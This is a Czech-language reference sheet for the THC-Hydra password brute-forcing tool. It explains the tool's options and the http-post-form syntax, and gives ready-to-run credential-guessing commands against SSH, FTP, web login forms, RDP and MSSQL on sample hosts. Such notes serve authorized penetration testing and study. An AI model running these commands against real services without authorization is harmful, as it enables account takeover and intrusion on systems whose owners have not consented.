## 🐉 THC-Hydra

> **Co to je:** Výkonný a velmi rychlý nástroj pro brute-force útoky na přihlašovací údaje síťových služeb a aplikací.
> 
> 🚀 **Klíčové vlastnosti:**
> 
> - **Rychlost:** Využívá paralelní vlákna (paralelní spojení) pro simultánní testování tisíců kombinací.
>     
> - **Univerzálnost:** Podporuje desítky protokolů (SSH, FTP, HTTP, RDP, SMB, databáze atd.).
>     
> - **Snadné použití:** Vytvořen s přímočarým syntaxem příkazového řádku.
>     

### ⚙️ Základní syntaxe a klíčové parametry

Bash

```
hydra [login_možnosti] [heslo_možnosti] [volby_útoku] [služba_a_cíl]
```

|**Parametr**|**Význam**|**Příklad použití**|
|---|---|---|
|**`-l LOGIN`**|Jedno konkrétní uživatelské jméno.|`-l admin`|
|**`-L SOUBOR`**|Seznam uživatelských jmen ze souboru.|`-L usernames.txt`|
|**`-p HESLO`**|Jedno konkrétní heslo.|`-p password123`|
|**`-P SOUBOR`**|Seznam hesel ze slovníku.|`-P /usr/share/wordlists/rockyou.txt`|
|**`-t THREADS`**|Počet paralelních vláken (standardně 16).|`-t 4` (pro citlivé/pomalé služby)|
|**`-f`**|Ukončí útok okamžitě při nalezení prvního platného hesla.|`-f`|
|**`-s PORT`**|Nestandardní port služby.|`-s 2121`|
|**`-M SOUBOR`**|Seznam cílových IP adres / serverů.|`-M targets.txt`|
|**`-v` / `-V`**|Verbose režim (zobrazí průběh a detaily pokusů).|`-v` nebo `-V`|
|**`-x GEN`**|Generování hesel on-the-fly (délka:znaky).|`-x 6:8:aA1`|

### 🔌 Podporované protokoly a příklady

|**Služba**|**Protokol / Modul**|**Typické použití / Příkaz**|
|---|---|---|
|**SSH**|`ssh`|Remote shell brute-forcing:<br><br>  <br><br>`hydra -l root -P passwords.txt ssh://192.168.1.100`|
|**FTP**|`ftp`|Přenos souborů na nestandardním portu:<br><br>  <br><br>`hydra -L users.txt -P pass.txt -s 2121 ftp://example.com`|
|**HTTP Web Form**|`http-post-form`|Přihlašovací formuláře webu:<br><br>  <br><br>`hydra -l admin -P pass.txt [www.site.com](https://www.site.com) http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|**HTTP Basic Auth**|`http-get`|Základní HTTP autentizace:<br><br>  <br><br>`hydra -L users.txt -P pass.txt example.com http-get`|
|**RDP**|`rdp`|Vzdálená plocha Windows (s generováním hesel):<br><br>  <br><br>`hydra -l administrator -x 6:8:aA1 192.168.1.100 rdp`|
|**Databáze**|`mysql`, `mssql`|Brute-forcing DB účtů (`root`, `sa`):<br><br>  <br><br>`hydra -l sa -P pass.txt mssql://192.168.1.100`|

### 💡 Důležité syntaxe pro HTTP Formuláře (`http-post-form`)

Struktura parametru pro HTTP formuláře se skládá ze tří částí oddělených dvojtečkou:

1. **Cesta k formuláři:** `/login.php`
    
2. **Tělo požadavku:** `user=^USER^&pass=^PASS^` _(zástupné symboly `^USER^` a `^PASS^` Hydra automaticky nahrazuje)_
    
3. **Podmínka neúspěchu/úspěchu:** `F=incorrect` _(neúspěšný pokus obsahuje text "incorrect")_ nebo `S=302` _(přesměrování při úspěchu)_.